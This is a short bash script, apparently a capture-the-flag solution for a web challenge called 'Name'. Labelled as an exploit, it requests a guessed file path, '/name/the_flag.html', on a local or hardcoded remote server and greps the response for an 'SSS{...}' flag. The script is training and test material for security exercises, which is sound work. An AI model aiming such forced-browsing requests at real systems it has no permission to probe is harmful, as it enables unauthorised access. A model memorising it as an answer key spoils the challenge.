#!/bin/bash
PORT=8089

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# Name
echo "Start exploit for Name"
url=$url'/name/'
flag=$(curl -s $url'the_flag.html' | grep -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
